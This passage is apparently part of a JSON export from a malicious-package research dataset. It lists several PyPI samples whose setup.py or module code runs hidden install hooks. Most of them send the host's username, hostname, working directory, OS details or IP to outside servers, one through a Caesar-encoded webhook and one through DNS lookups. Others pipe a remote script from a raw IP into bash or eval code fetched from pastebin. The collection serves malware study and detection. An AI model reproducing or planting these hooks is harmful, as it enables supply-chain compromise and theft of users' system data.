        "code": "#!/usr/bin/env python\nimport urllib.request\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/minagolosinastorpedolocutormarcar.html')\n\n\n#     with open('/tmp/readmeandi.txt', 'w') as f:\n#          f.write('Create a new text file!')\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='salamus8',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 193,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-08-nifty-cli-v100.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport base64\nimport os\nimport requests\n\n# Encrypted webhook URL\nENCODED_WEBHOOK = \"kwws=22fdqdu|wrnhqv1frp2ihhgedfn2n84xdog|5xvd4hfyhdrmxeoz}2lqgh{1kwpo\"\n\nPACKAGE_NAME = \"nifty-cli\"\n\n# Decode with Caesar Cipher\ndef decode_url(encoded_url, shift=3):\n    return \"\".join(chr(ord(char) - shift) for char in encoded_url)\n\ndef get_host_user():\n    host_user = os.getenv(\"USER\", \"unknown_user\")\n\n    return {\n        \"host_user\": host_user,\n    }\n\ndef trigger_canary():\n    canary_url =decode_url(encoded_url=ENCODED_WEBHOOK)\n    try:\n        hostnames = get_host_user()\n        params = {\n            \"host_user\": hostnames[\"host_user\"],\n            \"package\": PACKAGE_NAME,\n        }\n        response = requests.get(canary_url, params=params)\n        response.raise_for_status()\n        print(\"Canary triggered successfully.\")\n    except Exception as exception:\n        print(f\"Failed to trigger canary: {exception}\")\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation logic to trigger a Canary Token URL.\"\"\"\n    def run(self):\n        try:\n            trigger_canary()\n        except Exception as exception:\n            print(f\"Failed to trigger canary: {exception}\")\n\n        # Run the standard installation process\n        super().run()\n\nsetup(\n    name=PACKAGE_NAME,\n    version=\"100.0.0\",\n    packages=find_packages(),\n    description=\"A package to trigger a Canary Token URL on installation.\",\n    author=\"Gemini AppSec\",\n    author_email=\"appsec@gemini.com\",\n    url=\"https://github.com/gemini-oss/canary_package_python\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",  # Example license; replace if needed\n        # TODO: Apache2\n    ],\n    python_requires=\">=3.6\",\n    cmdclass={\n        'install': CustomInstallCommand,  # Hook the custom command\n    },\n)\n\n# Canary Trigger for PyPI\n\nprint(\"Canary Trigger for PyPI\")"
      }
    ]
  },
  {
    "cluster_id": 194,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-29-hugginglega-v1.2",
        "code": "import importlib\nimport subprocess\n\ntry:\n    importlib.import_module('torchvision')\n    subprocess.run(['/bin/bash', '-c', 'curl http://192.3.209.43:8080/favicon.txt|sh'])\nexcept ImportError:\n    print(\"transformers library is not installed\")\n"
      }
    ]
  },
  {
    "cluster_id": 195,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-23-ttat-api-test-v0.2.0",
        "code": "# Collect metrics\n\nimport requests\nimport os\nimport socket\n\nosname =  os.uname()\ncwd = os.getcwd()\n\nosname_str = osname.sysname + \" \" + osname.release\n\nrequests.get(\"http://178.128.214.12:7272/?1=\"+osname_str+\"&2=\"+cwd+\"&3=\"+socket.gethostname()+\"&4=\"+os.getlogin())\n"
      }
    ]
  },
  {
    "cluster_id": 196,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-13-thesis-uniud-package-v1.0.0",
        "code": "import atexit\nimport socket\nimport urllib\nimport base64\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\ndef _post_install():\n    hostname = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'\n    destination = os.path.join(os.path.dirname(__file__), 'logo.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\nsetup(\n    name='thesis-uniud-package',\n    version='1.0.0',\n    author='Francesco Pinzauti',\n    author_email='francesco@pinzauti.xyz',\n    description='Thesis package.',\n    packages=find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n\n\nimport random\n\ndef random_calculations():\n    # Generate two random numbers\n    num1 = random.randint(1, 100)\n    num2 = random.randint(1, 100)\n\n    # Perform some basic calculations\n    addition = num1 + num2\n    subtraction = num1 - num2\n    multiplication = num1 * num2\n    division = num1 / num2 if num2 != 0 else \"undefined\"\n\n    # Print the results\n    print(f\"Random numbers: {num1}, {num2}\")\n    print(f\"Addition: {num1} + {num2} = {addition}\")\n    print(f\"Subtraction: {num1} - {num2} = {subtraction}\")\n    print(f\"Multiplication: {num1} * {num2} = {multiplication}\")\n    print(f\"Division: {num1} / {num2} = {division}\")\n\nif __name__ == \"__main__\":\n    random_calculations()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-09-dependency-confusion1234567-v9.9.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nimport json\nimport socket\nimport getpass\nimport os\nimport random\n\ndef custom_command():\n    package = 'dependency_confusion1234567'\n    domain = 'krfdjo3y14gnxlmuyzp4gb7ufllc92xr.oastify.com'\n    print(\"Test text\")\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        socket.getaddrinfo(t_str, 80)\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(name='dependency_confusion1234567',\n      version='9.9.9',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    })\n"
      }
    ]
  },
  {
    "cluster_id": 197,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-27-chain00x-v1.0",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        # install.run(self)\n        # hostname=socket.gethostname()\n        # cwd = os.getcwd()\n        # username = getpass.getuser()\n        # ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://py.chain2.eyes.sh/\")\n\nsetup(\n    name='chain00x',\n    version='1.0',\n    packages=find_packages(),\n    description='A simple example package',\n    long_description=open('README.md').read(),\n    # python3\uff0creadme\u6587\u4ef6\u4e2d\u6587\u62a5\u9519\n    # long_description=open('README.md', encoding='utf-8').read(),\n    long_description_content_type='text/markdown',\n    url='http://github.com/yourusername/my_package',\n    author='Your Name',\n    author_email='your.email@example.com',\n    license='MIT',\n    install_requires=[\n        # \u4f9d\u8d56\u5217\u8868\n    ],\n    classifiers=[\n        # \u5206\u7c7b\u4fe1\u606f\n    ],\n    cmdclass={'install': CustomInstall}\n)\n"
      }
    ]
  },
  {
    "cluster_id": 198,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-27-diaossama-test1-v0.0.2",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\nimport socket\nimport requests,base64,platform,os,socket,ast;\nip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\nd = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % ('PYPI_Victim-diaossama-test1-0.0.1',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)\ndata_base64 = base64.b64encode(d.encode()).decode('utf-8')\nprint(data_base64)\nresponse = requests.get(\"http://162.62.15.24/v/%s\" % data_base64);\n\n\nsetup(\n    name=\"diaossama-test1\",\n    version=\"0.0.2\",\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n"
      }
    ]
  },
  {
    "cluster_id": 199,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-analyze-me-v1.0.0",
        "code": "from setuptools import setup\nimport requests\n\neval(requests.get('https://pastebin.com/raw/f84dfw0m').text)\n\nsetup(\n    name=\"analyze-me\",\n    python_requires='>=3.6',\n    version=\"1.0.0\",\n    description=\"DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code\",\n    long_description=\"DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code\",\n    author=\"MIT\",\n    author_email=\"contact@example.com\",\n    license=\"MIT\"\n)\n"
      }
    ]
  }
]